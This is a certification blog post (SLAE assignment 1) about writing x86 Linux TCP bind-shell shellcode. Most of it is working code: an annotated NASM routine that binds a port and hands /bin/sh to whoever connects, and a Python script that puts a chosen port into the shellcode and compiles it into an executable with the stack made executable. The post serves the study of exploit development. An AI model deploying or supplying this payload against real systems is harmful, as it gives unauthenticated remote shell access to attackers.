# Assignment 1: TCP Bind Shell

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-670


**Problem:**
- Create a Shell_Bind_TCP shellcode 
	- Binds to a port
	- Execs Shell on incoming connection
- Port number should be easily configurable


**Solution:**

To complete this task, it was necessary to research the steps that must be taken in order to open a port, receive an incomming connection, and gain system command execution powers remotely. 

By going over how this is done in C, it was possible to obtain the list of appropriate system calls that must be used to open a socket. Other shellcode found in the wild was studied to understand how command execution control can be transfered to the remotely connected computer via the socket. The system calls basically amount to this (with an additional setsockopt):

1. socket
2. setsockopt
3. bind
4. listen
5. dup2
6. execve

Going over the steps, first we create a socket file descriptor with the socket() system call. Then we enable any options we sit fit (if any) with setsockopt(), bind the socket descriptor to a port with the bind(), and begin listening with the listen() call. Once the socket is ready to receive incomming connections, with the dup() system call we remap the stdin, stdout and stderr streams to socket descriptor we created, and execute /bin/sh with the execve() system call. The effect produced within the context of this program, is that i/o interaction is passed to the socket, which effectively allows a remote computer to connect, send system commands and receive their output via the socket. 

All system calls, parameter structures, values, etc. used in the NASM code were looked up in the Linux **man** pages and the following libraries:


| What              | Where |
|:------------------|:------------------|
| system syscalls   | /usr/include/i386-linux-gnu/asm/unistd_32.h |
| socket syscalls   | /usr/include/linux/net.h |
| socket domains     | /usr/include/netinet/in.h   (Internet Address Family) |
| socket types       |  /usr/include/i386-linux-gnu/bits/socket_type.h |
| socket protocols    | /usr/include/i386-linux-gnu/bits/socket.h |
| socket options      | /usr/include/asm-generic/socket.h |




For the implementation part, a generic program was written in NASM to get the opcodes. Port configuration was done with Python using the opcodes from on the NASM prototype as a prototype and configuring the port opcodes based on user input. 

It is worth mentioning that this shellcode is by no means meant to be the shortest possible. Rather, the idea was to get a thorough grasp of every step necessary to achive the desired result. Detailed comments are added for maximum clarity



.

## bind.nasm:

```nasm
global _start

section .text

_start:

    
    ; socket
    ; int socketcall(int call, unsigned long *args);
    ; int socket(int domain, int type, int protocol);
    ;
    ; int socketcall(1, [2,1,6])

socket:
    xor eax, eax
    xor ebx, ebx
    push 6                      ; protocol = IPPROTO_IP = 6 (tcp)
    push 1                      ; type = SOCK_STREAM = 1
    push 2                      ; domain = PF_INET = 2
    mov ecx, esp                ; args = [2,1,6]
    mov bl, 1                   ; call = sys_socket = 1
    mov al, 102                 ; socketcall
    int 0x80

    mov esi, eax                ; esi == socketfd
    


    ; setsockopt 
    ; int socketcall(int call, unsigned long *args);
    ; int setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen);
    ;
    ; int socketcall(14, [socketfd, 1, 2, *1, 1])

setsockopt:
    xor eax, eax
    mov al, 1                   
    push eax                    ; optlen = 1
    mov ecx, esp
    push ecx                    ; *optval = 1
    inc eax
    push eax                    ; optname = SO_REUSEADDR = 2
    dec eax
    push eax                    ; level = SOL_SOCKET = 1
    push esi                    ; sockfd
    mov ecx, esp                ; args = [socketfd, 1, 2, *1, 1]
    mov bl, 14                  ; call = sys_setsockopt = 14
    mov al, 102                 ; socketcall
    int 0x80




    ; bind 
    ; int socketcall(int call, unsigned long *args);
    ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ;    struct sockaddr_in {
    ;        short            sin_family;   // word
    ;        unsigned short   sin_port;     // word
    ;        struct in_addr   sin_addr;     // dword (ulong)
    ;    };
    ;
    ; int socketcall(2, [socketfd, [2, 4444, 0]], 16)

bind:
    xor eax, eax
    push eax                    ; sin_addr = INADDR_ANY = 0
    push word 0x5c11            ; sin_port = 4444
    push word 2                 ; sin_family = PF_INET = 2
    mov ecx, esp                ; struct sockaddr *addr = [2, 4444, 0]
    push 16                     ; addrlen = 16
    push ecx                    ; struct sockaddr *addr
    push esi                    ; sockfd
    mov ecx, esp                ; args = [socketfd, [2, 4444, 0]]
    mov bl, 2                   ; call = sys_bind = 2
    mov al, 102                 ; socketcall
    int 0x80




    ; listen
    ; int socketcall(int call, unsigned long *args);
    ; int listen(int sockfd, int backlog);
    ;
    ; int socketcall(4, [socketfd, 4098])

listen:
    push word 4098              ; backlog = 4098
    push esi                    ; sockfd
    mov ecx, esp                ; args = [socketfd, 4098]
    mov bl, 4                   ; call = sys_listen = 4
    mov al, 102                 ; socketcall
    int 0x80




    ; accept
    ; int socketcall(int call, unsigned long *args);
    ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
    ;    struct sockaddr_in {
    ;        short            sin_family;   // word
    ;        unsigned short   sin_port;     // word
    ;        struct in_addr   sin_addr;     // dword (ulong)
    ;    };
    ;
    ; int socketcall(5, [socketfd, NULL, NULL])

accept:
    xor eax, eax
    push eax                    ; addrlen = NULL
    push eax                    ; struct sockaddr *addr = NULL
    push esi                    ; socketfd
    mov ecx, esp                ; args = [socketfd, NULL, NULL]
    mov bl, 5                   ; call = sys_accept = 5
    mov al, 102                 ; socketcall
    int 0x80

    mov edi, eax                ; clientfd



    ; remap i/o
    ; int dup2(int oldfd, int newfd);
    ;
    ; int dup2(clientfd, 2);
    ; int dup2(clientfd, 1);
    ; int dup2(clientfd, 0);

    xor ecx, ecx
    mov cl, 2                   ; newfd = stdin, stdout, stderr
    mov ebx, edi                ; oldfd = socketfd
    xor eax, eax
dup2:
    mov al, 63                  ; dup2
    int 0x80
    dec ecx
    jns dup2                    ; while not signed (not below 0)


  

    ; execve
    ; int execve(const char *filename, char *const argv[], char *const envp[]);
    ;
    ; int execve("/bin//sh", &cmd, 0)

execve:
    xor eax, eax
    push eax                    ; 0
    push 0x68732f2f             ; hs//
    push 0x6e69622f             ; nib/
    mov ebx, esp                ; filename

    push eax                    ; 0
    mov edx, esp                ; envp

    push ebx                    ; filename address
    mov ecx, esp                ; argv

    mov al, 11                  ; execve
    int 0x80
```


And the final Python implementation:

```python
#!/usr/bin/python

#####	Generate bind shellcode

import sys
import struct

if len(sys.argv) < 2 or int(sys.argv[1]) not in range(1,65536):
	sys.exit("Usage: bind.py [1-65535] [compiled.elf]")

port = struct.pack(">H", int(sys.argv[1]))

shellcode = (
	"\x31\xc0\x31\xdb\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xb3\x01"
	"\xb0\x66\xcd\x80\x89\xc6\x31\xc0\xb0\x01\x50\x89\xe1\x51"
	"\x40\x50\x48\x50\x56\x89\xe1\xb3\x0e\xb0\x66\xcd\x80\x31"
	"\xc0\x50\x66\x68"+port+"\x66\x6a\x02\x89\xe1\x6a\x10\x51"
	"\x56\x89\xe1\xb3\x02\xb0\x66\xcd\x80\x66\x68\x02\x10\x56"
	"\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xc0\x50\x50\x56\x89"
	"\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc7\x31\xc9\xb1\x02\x89"
	"\xfb\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68"
	"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2"
	"\x53\x89\xe1\xb0\x0b\xcd\x80\xe9\x76\xff\xff\xff"
	)

print
print "Shellcode Length: %d" % len(bytearray(shellcode))
print
sc = ""
for c in bytearray(shellcode):
	sc += "\\x%02x" % c
print sc


#####	Generate an executable 		


if len(sys.argv) < 3: sys.exit()

import os

skeleton = '''
#include<stdio.h>
#include<string.h>
unsigned char code[] = "__SHELLCODE__";
void main()
{
	printf("Shellcode Length: %d\\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
'''

skeleton = skeleton.replace("__SHELLCODE__", sc)

with open("a.c", "w") as f:
	f.write(skeleton)

os.system("gcc a.c -fno-stack-protector -z execstack")
os.rename("a.out", sys.argv[2])
os.remove("a.c")

print
print "Executable: %s" % sys.argv[2]
print

```

A sample run produces the following output:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-1/a1.png "Example")
